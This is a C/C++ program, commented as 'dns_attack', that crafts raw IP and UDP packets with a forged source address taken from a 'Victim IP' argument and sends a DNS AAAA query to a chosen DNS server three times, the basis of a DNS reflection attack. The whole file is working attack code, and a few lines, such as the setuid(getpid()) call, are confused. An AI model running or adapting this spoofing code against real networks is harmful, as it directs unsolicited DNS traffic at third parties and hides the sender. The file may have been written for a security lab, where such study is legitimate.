#include<memory.h>
#include<stdlib.h>
#include<stdio.h>
#include<unistd.h>
#include<sys/socket.h>
#include<netinet/ip.h>
#include<netinet/udp.h>
#include<linux/if_ether.h>
#include<linux/if_packet.h>
#include<netinet/if_ether.h>
#include<arpa/inet.h>
#include<iomanip>
#include<iostream>

// The packet bound
#define PCKT_LEN 100

//UDP header
struct UDP_Pst_Header
{
	u_int32_t src;
	u_int32_t des;
	u_int8_t  mbz;
	u_int8_t ptcl;
	u_int16_t len;
};

//UDP checksum
unsigned short cksum(unsigned short *buf, int nwords)
{ 
	unsigned long sum;
	for (sum = 0; nwords > 0; nwords--)
	{
		sum += *buf++;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return (unsigned short)(~sum);
}

// ./dns_attack <Source IP> <source port> <target IP>
int main(int argc, char *argv[])
{
	int st;
	char buffer[PCKT_LEN] ;
	
	unsigned char DNS[] = { 
		0xe0, 0xe0, // Query ID
		0x01, 0x00, // Query Flags
		0x00, 0x01, // Questions
		0x00, 0x00, // Answer RRs
		0x00, 0x00, // Authority RRs
		0x00, 0x00, // Additional RRs
		0x02, 0x61, 0x61, 0x04, 0x61, 0x67, 0x6b, 0x6e,
		0x03, 0x63, 0x6f, 0x6d, 0x00,  // Query Name
		0x00, 0x1c, // Query Type
		0x00, 0x01  // Query Class
		};
	
	// Create IP header & UDP header
	struct iphdr *ip = (struct iphdr *) buffer;
	struct udphdr *udp = (struct udphdr *) (buffer + sizeof(struct iphdr));
	
	// Source and destination addresses: IP and port
	struct sockaddr_in sin, din;
	
	int one = 1;
	const int *val = &one;
	
	// Clean all Buffer
	memset(buffer, 0, PCKT_LEN);

	// Check the Command Line Error
	if (argc != 4)
	{
		printf("- Invalid parameters.\n");
		printf("- Usage: %s <Victim IP> <Source port> <DNS Server IP>\n", argv[0]);
		exit(-1);
	}

	// Create a raw socket with UDP protocol
	st = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
	if (st < 0)
	{
		perror("Error. socket() cannot be created.");
		exit(-1);
	}
	else
		printf("Raw socket with UDP protocol is created successfully.\n");
	
	if (setsockopt(st, IPPROTO_IP, IP_HDRINCL, val, sizeof(int)))
	{
		perror("setsockopt() error");
		exit(-1);
	}
	else
		printf("setsockopt() is OK.\n");
	
	// The source is redundant
	// The Address 
	sin.sin_family = AF_INET;
	din.sin_family = AF_INET;
	// Port numbers
	sin.sin_port = htons(atoi(argv[2]));
	din.sin_port = htons(53);
	// IP addresses
	sin.sin_addr.s_addr = inet_addr(argv[1]);
	din.sin_addr.s_addr = inet_addr(argv[3]);

	// Fabricate the IP header with our own values.
	ip->ihl = 5;
	ip->version = 4;  // Header Length，4*32=128bit=16B
	ip->tos = 0;      // Service Type (TOS)
	ip->tot_len = (sizeof(struct iphdr) + sizeof(struct udphdr)+sizeof(DNS));  // Size of headers and data
	ip->id = htons(57568); // Identification
	ip->ttl = 64;          // hops living cycle (TTL)
	ip->protocol = 17;     // UDP
	ip->check = 0;         // Header Check
	ip->saddr = inet_addr(argv[1]); // Spoofing IP
	ip->daddr = inet_addr(argv[3]); // Target Server

	// Fabricate the UDP header with our own values.
	udp->source = htons(atoi(argv[2])); // Source Port
	udp->dest = htons(53);              // Destination Port 53(DNS)
	udp->len = htons(sizeof(struct udphdr)+sizeof(DNS)); // UDP length
	
	//forUDPCheckSum : Calculate Fake Header, UDP Header and data
	char * forUDPCheckSum = new char[sizeof(UDP_Pst_Header) + sizeof(udphdr)+sizeof(DNS)+1];
	memset(forUDPCheckSum, 0, sizeof(UDP_Pst_Header) + sizeof(udphdr) + sizeof(DNS) + 1);
	UDP_Pst_Header * udp_pst_Header = (UDP_Pst_Header *)forUDPCheckSum;
	udp_pst_Header->src = inet_addr(argv[1]);
	udp_pst_Header->des = inet_addr(argv[3]);
	udp_pst_Header->mbz = 0;
	udp_pst_Header->ptcl = 17;
	udp_pst_Header->len = htons(sizeof(udphdr)+sizeof(DNS));
	memcpy(forUDPCheckSum + sizeof(UDP_Pst_Header), udp, sizeof(udphdr));
	memcpy(forUDPCheckSum + sizeof(UDP_Pst_Header) + sizeof(udphdr), DNS, sizeof(DNS));

	// add "0" if length is odd.
	udp->check = cksum((unsigned short *)forUDPCheckSum,(sizeof(udphdr)+sizeof(UDP_Pst_Header)+sizeof(DNS)+1)/2); // UDP cksum

	setuid(getpid()); // Need root privilege

	// Send for every 1 second for 3 count
	printf("Source IP: %s port: %u\nDestination IP: %s port: %u.\n", argv[1], atoi(argv[2]), argv[3], 53);
	std::cout << "Ip length: " << ip->tot_len << std::endl;
	int count;
	// Move all packet parameters to buffer.
	memcpy(buffer + sizeof(iphdr) + sizeof(udphdr), DNS, sizeof(DNS));
	printf("Packet data is created successfully.\n");
	printf("Sending now...\n\n");
	
	for (count = 1; count <= 3; count++)
	{
		
		if (sendto(st, buffer, ip->tot_len, 0, (struct sockaddr *)&din, sizeof(din)) < 0)
		{
			perror("Sending Error.");
			exit(-1);
		}
		else
		{
			printf("Packet #%u is done.\n", count);
			sleep(1);
		}
	}
	close(st);
	return 0;
}